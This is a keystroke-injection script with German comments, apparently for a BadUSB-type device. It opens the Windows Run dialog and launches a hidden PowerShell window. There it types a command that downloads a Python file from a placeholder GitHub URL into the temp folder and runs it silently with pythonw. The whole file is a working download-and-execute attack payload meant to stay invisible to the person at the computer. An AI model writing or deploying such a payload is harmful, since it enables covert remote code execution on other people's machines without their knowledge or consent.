layout('de'); // Tastaturlayout auf Deutsch setzen
typingSpeed(20, 20); // Tippgeschwindigkeit (ms)

// 1. URL zu deiner Python-Datei auf GitHub (Raw-Link)
// Ich füge eine Zufallszahl (?v=...) an, damit Windows nicht eine alte Version aus dem Cache lädt
var rawUrl = "DEIN_GITHUB_RAW_LINK_HIER"; 
var cacheBuster = Math.floor(Math.random() * 10000);
var finalUrl = rawUrl + "?v=" + cacheBuster;

// 2. Ausführen-Dialog öffnen (Win + R)
press("GUI r");
delay(500);

// 3. PowerShell starten (im Hintergrund-Modus, falls möglich)
type("powershell -WindowStyle Hidden\n"); 
delay(1500);

// 4. Der kombinierte Befehl:
// - Definiert den Pfad im Temp-Ordner ($p)
// - Lädt die Datei von GitHub herunter (iwr = Invoke-WebRequest)
// - Startet die Datei mit Python (pythonw startet ohne CMD-Fenster)
// - Schließt die PowerShell (exit)
var psCommand = "$p=\"$env:TEMP\\a.py\"; iwr '" + finalUrl + "' -OutFile $p; pythonw $p; exit";

type(psCommand + "\n");
